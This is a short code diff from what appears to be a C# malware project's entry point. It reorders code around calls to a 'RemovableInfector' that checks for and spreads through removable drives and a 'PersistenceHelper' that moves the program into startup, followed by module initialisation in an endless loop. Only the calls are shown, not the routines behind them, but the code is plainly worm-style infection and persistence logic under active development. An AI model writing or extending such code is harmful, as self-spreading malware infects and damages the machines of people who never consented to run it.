@@ -33,6 +33,7 @@ namespace zort
                     {
                         service.OnStart(args);
                         //Console.WriteLine("Press any key to stop the service...");
+
                         while (true)
                         {
                             Console.ReadLine();
@@ -47,10 +48,10 @@ namespace zort
             }
             else
             {
-                var program = new Program();
                 RemovableInfector.CheckIfRunningFromRemovableDrive();
                 if (!RemovableInfector.IsSystemInfected()) PersistenceHelper.MoveAndRunFromStartup();
                 else Environment.Exit(0);
+                var program = new Program();
                 program.InitModules();
                 //Console.WriteLine("Press any key to exit...");
                 while (true)
